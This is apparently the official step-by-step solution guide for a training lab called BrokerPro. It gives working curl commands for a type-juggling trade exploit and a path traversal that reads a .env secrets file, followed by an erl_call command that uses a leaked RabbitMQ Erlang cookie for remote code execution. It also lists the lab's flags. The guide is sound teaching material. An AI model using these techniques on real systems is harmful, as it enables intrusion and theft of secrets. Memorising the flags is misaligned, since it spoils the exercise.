# Walkthrough: BrokerPro Official Solution Guide

This guide provides the step-by-step technical execution required to solve the BrokerPro lab, progressing from a simple business logic flaw to full infrastructure compromise.

## Stage 1: The Infinite Money Exploit (Dynamic Type Juggling)

The objective is to reach an account balance of $1,000,000 to trigger the first flag.

### The Vulnerability
The `/api/trade` endpoint uses weak type checking. By sending the `quantity` as an array containing a negative string, we can flip the mathematical operations.

### Execution
Run the following `curl` command to "buy" a negative amount, which effectively adds money to your balance:

```bash
curl -X POST http://[VM_IP]/api/trade \
     -H "Content-Type: application/json" \
     -d '{"action": "buy", "symbol": "AAPL", "quantity": ["-10000"]}'
```

**Result**: Your balance will jump by $1.5M+. 
**Flag 1**: `VulnOs{byp4ss3d_l0g1c_1nf1n1t3_m0n3y}`

---

## Stage 2: Exfiltrating System Secrets (Path Traversal)

The objective is to read the backend [.env](file:///c:/prateek/projects/project-broker-lab/backend/.env) file to find internal secrets.

### The Vulnerability
The `/api/logs` endpoint is vulnerable to path traversal because it does not sanitize the [file](file:///c:/prateek/projects/project-broker-lab/bot/Dockerfile) parameter.

### Execution
Use `../` to break out of the `logs/` directory and read the root [.env](file:///c:/prateek/projects/project-broker-lab/backend/.env) file:

```bash
curl "http://[VM_IP]/api/logs?file=../.env"
```

**Result**: The contents of the [.env](file:///c:/prateek/projects/project-broker-lab/backend/.env) file are returned.
**Flag 2**: `VulnOs{p4th_tr4v3rs4l_3nv_l34k}`

---

## Stage 3: Identifying the Infrastructure Master Key

From the exfiltrated [.env](file:///c:/prateek/projects/project-broker-lab/backend/.env) file in Stage 2, look for the following critical piece of information:

```env
RABBITMQ_ERLANG_COOKIE=broker-super-secret-cookie-99321
```

This cookie is the shared secret used by the Erlang/RabbitMQ nodes for authentication.

---

## Stage 4: Infrastructure Takeover (Erlang RPC RCE)

The final objective is to use the leaked cookie to execute code on the RabbitMQ container and read the root flag.

### The Vulnerability
RabbitMQ exposes the Erlang Distribution port (`25672`). With the secret cookie, any authenticated node can trigger a Remote Procedure Call (RPC).

### Execution
On your local machine (with Erlang installed), use the `erl_call` utility to execute a system command on the remote node:

```bash
# Execute 'cat /root/root.txt' on the remote rabbitmq node
erl_call -address [VM_IP]:25672 \
         -c 'broker-super-secret-cookie-99321' \
         -name rabbitmq \
         -a 'os cmd ["cat /root/root.txt"]'
```

**Note**: You may need to ensure port `4369` (EPMD) is also accessible.

**Final Flag**: `VulnOs{3rl4ng_rpc_r00t_c00k13_m4st3r}`

---

## Summary of Compromise
1.  **Business Logic**: Manipulated the trading engine for infinite funds.
2.  **Filesystem**: Accessed the underlying OS configuration via Path Traversal.
3.  **Privilege Escalation**: Used a leaked administrative secret to gain Remote Code Execution (RCE) on the core infrastructure.
